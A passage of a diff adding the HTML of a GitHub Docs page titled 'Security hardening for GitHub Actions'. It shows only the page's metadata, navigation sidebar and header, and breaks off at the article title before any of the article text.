@@ -1,0 +1,679 @@
+<!doctype html>
+<html lang="en" data-color-mode="auto" data-dark-theme="dark" data-light-theme="light"> 
+ <head> 
+  <meta charset="utf-8"> 
+  <title>Security hardening for GitHub Actions - GitHub Docs</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1"> 
+  <link rel="alternate icon" type="image/png" href="/assets/images/site/favicon.png"> 
+  <link rel="icon" type="image/svg+xml" href="/assets/images/site/favicon.svg"> 
+  <link rel="stylesheet" href="/dist/index.css?hash=bc6adbf212ea3e62f9ab6992ce340717"> 
+  <meta name="description" content="Good security practices for using GitHub Actions features."> 
+  <meta name="keywords" content="Security"> 
+  <link rel="alternate" hreflang="en" href="https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions"> 
+  <link rel="alternate" hreflang="zh-Hans" href="https://docs.github.com/cn/actions/learn-github-actions/security-hardening-for-github-actions"> 
+  <link rel="alternate" hreflang="ja" href="https://docs.github.com/ja/actions/learn-github-actions/security-hardening-for-github-actions"> 
+  <link rel="alternate" hreflang="es" href="https://docs.github.com/es/actions/learn-github-actions/security-hardening-for-github-actions"> 
+  <link rel="alternate" hreflang="pt" href="https://docs.github.com/pt/actions/learn-github-actions/security-hardening-for-github-actions"> 
+  <link rel="alternate" hreflang="de" href="https://docs.github.com/de/actions/learn-github-actions/security-hardening-for-github-actions"> 
+  <meta name="google-site-verification" content="OgdQc0GZfjDI52wDv1bkMT-SLpBUo_h5nn9mI9L22xQ"> 
+  <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY"> 
+  <meta name="csrf-token" content="dgRyQo8t-F_osMvfY-wLGw3c6nvmW2ZpElHA"> 
+  <meta name="site.data.ui.search.placeholder" content="Search topics, products..."> 
+ </head> 
+ <body class="d-lg-flex"> <!-- product > category > maptopic > article --> 
+  <div class="sidebar d-none d-lg-block color-bg-tertiary"> 
+   <div class="d-flex flex-items-center p-4 position-sticky top-0 color-bg-tertiary" style="z-index: 3;" id="github-logo" role="banner"> <a href="/en" class="color-text-primary" aria-hidden="true" tabindex="-1"> 
+     <svg version="1.1" width="32" height="32" viewbox="0 0 16 16" class="octicon octicon-mark-github" aria-hidden="true">
+      <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+     </svg> </a> <a href="/en" class="h4-mktg color-text-primary no-underline no-wrap pl-2 flex-auto">GitHub Docs</a> 
+   </div> 
+   <nav> 
+    <ul class="sidebar-products"> <!--
+  Styling note:
+
+  Categories, Maptopics, and Articles list items get a class of `active` when they correspond to content
+  hierarchy of the current page. If an item's URL is also the same as the current URL, the item
+  also gets an `is-current-page` class.
+ --> 
+     <li title="Home"> <a href="/en" class="f6 pl-4 pr-5 ml-n1 pb-1 color-text-primary"> 
+       <svg xmlns="http://www.w3.org/2000/svg" class="octicon" viewbox="0 0 16 16" width="16" height="16"> <path fill-rule="evenodd" clip-rule="evenodd" d="M7.78033 12.5303C7.48744 12.8232 7.01256 12.8232 6.71967 12.5303L2.46967 8.28033C2.17678 7.98744 2.17678 7.51256 2.46967 7.21967L6.71967 2.96967C7.01256 2.67678 7.48744 2.67678 7.78033 2.96967C8.07322 3.26256 8.07322 3.73744 7.78033 4.03033L4.81066 7L12.25 7C12.6642 7 13 7.33579 13 7.75C13 8.16421 12.6642 8.5 12.25 8.5L4.81066 8.5L7.78033 11.4697C8.07322 11.7626 8.07322 12.2374 7.78033 12.5303Z"></path>
+       </svg> All products </a> </li> 
+     <li title="" class="sidebar-product mb-2"> <a href="/en/actions" class="pl-4 pr-5 pb-1 f4 color-text-primary">GitHub Actions</a> </li> 
+     <li> 
+      <ul class="sidebar-categories list-style-none"> 
+       <li class="sidebar-category py-1 standalone-category"> <a href="/en/actions/quickstart" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Quickstart for GitHub Actions</a> <!-- some categories have maptopics with child articles -->  </li> 
+       <li class="sidebar-category py-1 "> 
+        <details class="dropdown-withArrow details details-reset" open> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/guides" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Guides</a> 
+           <svg xmlns="http://www.w3.org/2000/svg" class="octicon flex-shrink-0 arrow mr-3" style="margin-top:7px" viewbox="0 0 16 16" width="16" height="16"> <path fill-rule="evenodd" clip-rule="evenodd" d="M12.7803 6.21967C13.0732 6.51256 13.0732 6.98744 12.7803 7.28033L8.53033 11.5303C8.23744 11.8232 7.76256 11.8232 7.46967 11.5303L3.21967 7.28033C2.92678 6.98744 2.92678 6.51256 3.21967 6.21967C3.51256 5.92678 3.98744 5.92678 4.28033 6.21967L8 9.93934L11.7197 6.21967C12.0126 5.92678 12.4874 5.92678 12.7803 6.21967Z"></path>
+           </svg> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+         <ul class="sidebar-articles list-style-none"> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/about-continuous-integration" class="pl-6 pl-4 pr-5 py-1 color-text-primary">About continuous integration</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/setting-up-continuous-integration-using-workflow-templates" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Setting up CI using templates</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-nodejs" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Node.js</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-net" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing .NET</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-powershell" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing PowerShell</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-python" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Python</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-ruby" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Ruby</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-java-with-maven" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Java with Maven</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-java-with-gradle" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Java with Gradle</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-java-with-ant" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Java with Ant</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-swift" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Swift</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/installing-an-apple-certificate-on-macos-runners-for-xcode-development" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Installing an Apple certificate on macOS runners for Xcode development</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/building-and-testing-xamarin-applications" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Building and testing Xamarin applications</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/about-packaging-with-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">About packaging with GitHub Actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/publishing-nodejs-packages" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Publishing Node.js packages</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/publishing-java-packages-with-maven" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Publishing Java packages with Maven</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/publishing-java-packages-with-gradle" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Publishing Java packages with Gradle</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/publishing-docker-images" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Publishing Docker images</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/storing-workflow-data-as-artifacts" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Storing workflow artifacts</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/caching-dependencies-to-speed-up-workflows" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Caching dependencies</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/about-service-containers" class="pl-6 pl-4 pr-5 py-1 color-text-primary">About service containers</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/creating-redis-service-containers" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Redis service containers</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/creating-postgresql-service-containers" class="pl-6 pl-4 pr-5 py-1 color-text-primary">PostgreSQL service containers</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/deploying-to-amazon-elastic-container-service" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Deploying to Amazon Elastic Container Service</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/deploying-to-azure-app-service" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Deploying to Azure App Service</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/deploying-to-google-kubernetes-engine" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Deploying to Google Kubernetes Engine</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/deploying-to-google-kubernetes-engine" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Deploying to Google Kubernetes Engine</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/using-github-actions-for-project-management" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Using GitHub Actions for project management</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/closing-inactive-issues" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Closing inactive issues</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/scheduling-issue-creation" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Scheduling issue creation</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/adding-labels-to-issues" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Adding labels to issues</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/commenting-on-an-issue-when-a-label-is-added" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Commenting on an issue when a label is added</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/moving-assigned-issues-on-project-boards" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Moving assigned issues on project boards</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/removing-a-label-when-a-card-is-added-to-a-project-board-column" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Removing a label when a card is added to a project board column</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/guides/managing-github-actions-with-github-cli" class="pl-6 pl-4 pr-5 py-1 pb-2 color-text-primary">Managing GitHub Actions with GitHub CLI</a> </li> 
+         </ul> 
+        </details> </li> 
+       <li class="sidebar-category py-1 active "> 
+        <details class="dropdown-withArrow details details-reset" open> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/learn-github-actions" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Learn GitHub Actions</a> 
+           <svg xmlns="http://www.w3.org/2000/svg" class="octicon flex-shrink-0 arrow mr-3" style="margin-top:7px" viewbox="0 0 16 16" width="16" height="16"> <path fill-rule="evenodd" clip-rule="evenodd" d="M12.7803 6.21967C13.0732 6.51256 13.0732 6.98744 12.7803 7.28033L8.53033 11.5303C8.23744 11.8232 7.76256 11.8232 7.46967 11.5303L3.21967 7.28033C2.92678 6.98744 2.92678 6.51256 3.21967 6.21967C3.51256 5.92678 3.98744 5.92678 4.28033 6.21967L8 9.93934L11.7197 6.21967C12.0126 5.92678 12.4874 5.92678 12.7803 6.21967Z"></path>
+           </svg> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+         <ul class="sidebar-articles list-style-none"> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/introduction-to-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Introduction to GitHub Actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/finding-and-customizing-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Finding and customizing actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/essential-features-of-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Essential features</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/managing-complex-workflows" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Managing complex workflows</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/sharing-workflows-with-your-organization" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Sharing workflows with your organization</a> </li> 
+          <li class="sidebar-article active is-current-page"> <a href="/en/actions/learn-github-actions/security-hardening-for-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Security hardening</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/migrating-from-azure-pipelines-to-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Migrating from Azure Pipelines to GitHub Actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/migrating-from-circleci-to-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Migrating from CircleCI to GitHub Actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/migrating-from-gitlab-cicd-to-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Migrating from GitLab CI/CD to GitHub Actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/migrating-from-jenkins-to-github-actions" class="pl-6 pl-4 pr-5 py-1 color-text-primary">Migrating from Jenkins to GitHub Actions</a> </li> 
+          <li class="sidebar-article "> <a href="/en/actions/learn-github-actions/migrating-from-travis-ci-to-github-actions" class="pl-6 pl-4 pr-5 py-1 pb-2 color-text-primary">Migrating from Travis CI to GitHub Actions</a> </li> 
+         </ul> 
+        </details> </li> 
+       <li class="sidebar-category py-1 "> 
+        <details class="dropdown-withArrow details details-reset"> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/managing-workflow-runs" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Managing workflow runs</a> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+        </details> </li> 
+       <li class="sidebar-category py-1 "> 
+        <details class="dropdown-withArrow details details-reset"> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/creating-actions" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Creating actions</a> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+        </details> </li> 
+       <li class="sidebar-category py-1 "> 
+        <details class="dropdown-withArrow details details-reset"> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/using-github-hosted-runners" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Using GitHub-hosted runners</a> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+        </details> </li> 
+       <li class="sidebar-category py-1 "> 
+        <details class="dropdown-withArrow details details-reset"> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/hosting-your-own-runners" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Hosting your own runners</a> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+        </details> </li> 
+       <li class="sidebar-category py-1 "> 
+        <details class="dropdown-withArrow details details-reset"> <summary> 
+          <div class="d-flex flex-justify-between"> <a href="/en/actions/reference" class="pl-4 pr-2 py-2 f6 text-uppercase d-block flex-auto mr-3 color-text-primary">Reference</a> 
+          </div> </summary> <!-- some categories have maptopics with child articles --> 
+        </details> </li> 
+      </ul> </li> 
+    </ul> 
+   </nav> 
+  </div> 
+  <main class="width-full"> 
+   <div class="border-bottom color-border-secondary no-print"> <!-- START TRANSLATIONS NOTICES --> <!-- END TRANSLATIONS NOTICES --> <!-- START RELEASE NOTICES --> <!-- Custom GitHub AE notice --> <!-- END RELEASE NOTICES --> <!-- ONEOFF EARLY ACCESS NOTICE --> <!-- END ONEOFF EARLY ACCESS NOTICE --> 
+    <header class="container-xl px-3 px-md-6 pt-3 pb-2 position-relative d-flex flex-justify-between width-full "> 
+     <div class="d-flex flex-items-center d-lg-none" style="z-index: 3;" id="github-logo-mobile" role="banner"> <a href="/en" aria-hidden="true" tabindex="-1"> 
+       <svg version="1.1" width="32" height="32" viewbox="0 0 16 16" class="octicon octicon-mark-github color-icon-primary" aria-hidden="true">
+        <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+       </svg> </a> <a href="/en" class="h4-mktg color-text-primary no-underline no-wrap pl-2">GitHub Docs</a> 
+     </div> 
+     <div class="width-full"> 
+      <div class="d-inline-block width-full d-md-flex" style="z-index: 1;"> <button class="nav-mobile-burgerIcon float-right mt-1 border-0 d-md-none" type="button" aria-label="Toggle navigation"> <!-- Hamburger icon added with css --> </button> 
+       <div style="z-index: 2;" class="nav-mobile-dropdown width-full"> 
+        <div class="d-md-flex flex-justify-between flex-items-center"> 
+         <div class="py-2 py-md-0 d-md-inline-block"> 
+          <h4 class="text-mono f5 text-normal color-text-secondary d-md-none">Explore by product</h4> 
+          <details class="dropdown-withArrow position-relative details details-reset d-md-none close-when-clicked-outside"> <summary class="nav-desktop-productDropdownButton color-text-link py-2" role="button" aria-label="Toggle products list"> 
+            <div id="current-product" class="d-flex flex-items-center flex-justify-between" style="padding-top: 2px;"> <!-- Product switcher - GitHub.com, Enterprise Server, etc --> <!-- 404 and 500 error layouts are not real pages so we need to hardcode the name for those --> GitHub Actions 
+             <svg class="arrow ml-md-1" width="14px" height="8px" viewbox="0 0 14 8" xml:space="preserve" fill="none" stroke="currentColor">
+              <path d="M1,1l6.2,6L13,1"></path>
+             </svg> 
+            </div> </summary> <!-- Mobile-only product dropdown --> 
+           <div id="homepages" class="position-md-absolute nav-desktop-productDropdown p-md-4 left-md-n4 top-md-6" style="z-index: 6;"> <a href="/en/github" class="d-block py-2
+                      Link--primary no-underline"> GitHub.com </a> <a href="/en/enterprise-server@3.1/admin" class="d-block py-2
+                      Link--primary no-underline"> GitHub Enterprise </a> <a href="/en/billing" class="d-block py-2
+                      Link--primary no-underline"> Billing and payments </a> <a href="/en/organizations" class="d-block py-2
+                      Link--primary no-underline"> Organizations </a> <a href="/en/code-security" class="d-block py-2
+                      Link--primary no-underline"> Code security </a> <a href="/en/actions" class="d-block py-2
+                      color-text-link text-underline active"> GitHub Actions </a> <a href="/en/packages" class="d-block py-2
+                      Link--primary no-underline"> GitHub Packages </a> <a href="/en/developers" class="d-block py-2
+                      Link--primary no-underline"> Developers </a> <a href="/en/rest" class="d-block py-2
+                      Link--primary no-underline"> REST API </a> <a href="/en/graphql" class="d-block py-2
+                      Link--primary no-underline"> GraphQL API </a> <a href="/en/enterprise-server@3.1/insights" class="d-block py-2
+                      Link--primary no-underline"> GitHub Insights </a> <a href="/en/issues" class="d-block py-2
+                      Link--primary no-underline"> Issues and projects </a> <a href="/en/discussions" class="d-block py-2
+                      Link--primary no-underline"> GitHub Discussions </a> <a href="/en/codespaces" class="d-block py-2
+                      Link--primary no-underline"> GitHub Codespaces </a> <a href="/en/sponsors" class="d-block py-2
+                      Link--primary no-underline"> GitHub Sponsors </a> <a href="/en/communities" class="d-block py-2
+                      Link--primary no-underline"> Building communities </a> <a href="/en/pages" class="d-block py-2
+                      Link--primary no-underline"> GitHub Pages </a> <a href="/en/education" class="d-block py-2
+                      Link--primary no-underline"> Education </a> <a href="/en/desktop" class="d-block py-2
+                      Link--primary no-underline"> GitHub Desktop </a> <a href="https://cli.github.com/manual" target="_blank" class="d-block py-2
+                      Link--primary no-underline"> GitHub CLI <span class="ml-1">
+              <svg width="9" height="10" viewbox="0 0 9 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+               <path stroke="currentColor" d="M.646 8.789l8-8M8.5 9V1M1 .643h8" />
+              </svg></span> </a> <a href="https://atom.io/docs" target="_blank" class="d-block py-2
+                      Link--primary no-underline"> Atom <span class="ml-1">
+              <svg width="9" height="10" viewbox="0 0 9 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+               <path stroke="currentColor" d="M.646 8.789l8-8M8.5 9V1M1 .643h8" />
+              </svg></span> </a> <a href="https://electronjs.org/docs" target="_blank" class="d-block py-2
+                      Link--primary no-underline"> Electron <span class="ml-1">
+              <svg width="9" height="10" viewbox="0 0 9 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+               <path stroke="currentColor" d="M.646 8.789l8-8M8.5 9V1M1 .643h8" />
+              </svg></span> </a> <a href="https://codeql.github.com/docs" target="_blank" class="d-block py-2
+                      Link--primary no-underline"> CodeQL <span class="ml-1">
+              <svg width="9" height="10" viewbox="0 0 9 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+               <path stroke="currentColor" d="M.646 8.789l8-8M8.5 9V1M1 .643h8" />
+              </svg></span> </a> 
+           </div> 
+          </details> 
+         </div> <!-- Versions picker that only appears in the header on landing pages --> <!-- Versions picker that only appears in the header on homepage or product landing --> 
+         <div class="d-md-inline-block"> <!-- Language picker - 'English', 'Japanese', etc --> 
+          <div class="border-top border-md-top-0 py-2 py-md-0 d-md-inline-block"> 
+           <details class="dropdown-withArrow position-relative details details-reset mr-md-3 close-when-clicked-outside"> <summary class="py-2 color-text-primary" role="button" aria-label="Toggle languages list"> 
+             <div class="d-flex flex-items-center flex-justify-between">
+               English 
+              <svg class="arrow ml-md-1" width="14px" height="8px" viewbox="0 0 14 8" xml:space="preserve" fill="none" stroke="currentColor">
+               <path d="M1,1l6.2,6L13,1"></path>
+              </svg> 
+             </div> </summary> 
+            <div id="languages-selector" class="position-md-absolute nav-desktop-langDropdown p-md-4 right-md-n4 top-md-6" style="z-index: 6;"> <a href="/en/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 no-underline active " style="white-space: nowrap"> English </a> <a href="/cn/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 no-underline Link--primary" style="white-space: nowrap"> ???? (Simplified Chinese) </a> <a href="/ja/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 no-underline Link--primary" style="white-space: nowrap"> ??? (Japanese) </a> <a href="/es/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 no-underline Link--primary" style="white-space: nowrap"> Español (Spanish) </a> <a href="/pt/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 no-underline Link--primary" style="white-space: nowrap"> Português do Brasil (Portuguese) </a> 
+            </div> 
+           </details> 
+          </div> <!-- GitHub.com homepage and 404 page has a stylized search; Enterprise homepages do not --> 
+          <div class="pt-3 pt-md-0 d-md-inline-block ml-md-3 border-top border-md-top-0"> <!--
+  This form is used in two places:
+
+  - On the homepage, front and center
+  - On all other pages, in the header
+ --> 
+           <div id="search-input-container" aria-hidden="true"> <!-- will add a search input here --> 
+           </div> 
+           <div id="search-results-container"></div> 
+           <div class="search-overlay-desktop"></div> 
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+    </header> 
+   </div> 
+   <div class="container-xl px-3 px-md-6 my-4 my-lg-4 d-xl-flex"> 
+    <article class="markdown-body width-full"> 
+     <div class="d-lg-flex flex-justify-between"> 
+      <div class="d-block d-lg-none"> 
+       <details class="dropdown-withArrow d-inline-block details details-reset mb-1 position-relative close-when-clicked-outside article-versions"> <summary class="f4 h5-mktg btn-outline-mktg btn-mktg p-2"> <!-- GitHub.com, Enterprise Server 2.16, etc --> <span class="d-md-none d-xl-inline-block">Article version:</span> GitHub.com 
+         <svg class="arrow ml-1" width="14px" height="8px" viewbox="0 0 14 8" xml:space="preserve" fill="none" stroke="currentColor">
+          <path d="M1,1l6.2,6L13,1"></path>
+         </svg> </summary> 
+        <div class="nav-dropdown position-absolute color-bg-primary rounded-1 px-4 py-3 top-7 color-shadow-large" style="z-index: 6; width: 210px;"> <a href="/en/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 link-blue active"> GitHub.com</a> <a href="/en/enterprise-server@3.1/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> Enterprise Server 3.1</a> <a href="/en/enterprise-server@3.0/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> Enterprise Server 3.0</a> <a href="/en/enterprise-server@2.22/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> Enterprise Server 2.22</a> <a href="/en/github-ae@latest/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> GitHub AE</a> <a class="f6 no-underline color-text-tertiary pt-1" href="/en/enterprise-server@3.1/admin/all-releases">See all Enterprise releases</a> 
+        </div> 
+       </details> 
+      </div> 
+      <div class="d-flex flex-items-center breadcrumbs-wrapper"> 
+       <nav class="breadcrumbs f5" aria-label="Breadcrumb">
+        <a title="product: GitHub Actions" href="/en/actions" class="d-inline-block ">GitHub Actions</a><a title="category: Learn GitHub Actions" href="/en/actions/learn-github-actions" class="d-inline-block ">Learn GitHub Actions</a><a title="article: Security hardening" href="/en/actions/learn-github-actions/security-hardening-for-github-actions" class="d-inline-block color-text-tertiary">Security hardening</a>
+       </nav> 
+      </div> 
+      <div class="d-none d-lg-block"> 
+       <details class="dropdown-withArrow d-inline-block details details-reset mb-1 position-relative close-when-clicked-outside article-versions"> <summary class="f4 h5-mktg btn-outline-mktg btn-mktg p-2"> <!-- GitHub.com, Enterprise Server 2.16, etc --> <span class="d-md-none d-xl-inline-block">Article version:</span> GitHub.com 
+         <svg class="arrow ml-1" width="14px" height="8px" viewbox="0 0 14 8" xml:space="preserve" fill="none" stroke="currentColor">
+          <path d="M1,1l6.2,6L13,1"></path>
+         </svg> </summary> 
+        <div class="nav-dropdown position-absolute color-bg-primary rounded-1 px-4 py-3 top-7 color-shadow-large" style="z-index: 6; width: 210px;"> <a href="/en/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 link-blue active"> GitHub.com</a> <a href="/en/enterprise-server@3.1/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> Enterprise Server 3.1</a> <a href="/en/enterprise-server@3.0/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> Enterprise Server 3.0</a> <a href="/en/enterprise-server@2.22/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> Enterprise Server 2.22</a> <a href="/en/github-ae@latest/actions/learn-github-actions/security-hardening-for-github-actions" class="d-block py-2 Link--primary no-underline"> GitHub AE</a> <a class="f6 no-underline color-text-tertiary pt-1" href="/en/enterprise-server@3.1/admin/all-releases">See all Enterprise releases</a> 
+        </div> 
+       </details> 
+      </div> 
+     </div> 
+     <div class="mt-2 article-grid-container"> 
+      <div class="article-grid-head"> 
+       <div class="d-flex flex-items-baseline flex-justify-between mt-3"> 
+        <h1 class="border-bottom-0">Security hardening for GitHub Actions</h1> 
+        <div class="d-none d-lg-block ml-2"> <button class="btn-link Link--secondary js-print tooltipped tooltipped-n" aria-label="Print this article"> <!-- From https://heroicons.dev/ --> 
+          <svg fill="none" height="18" width="18" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" stroke="currentColor">
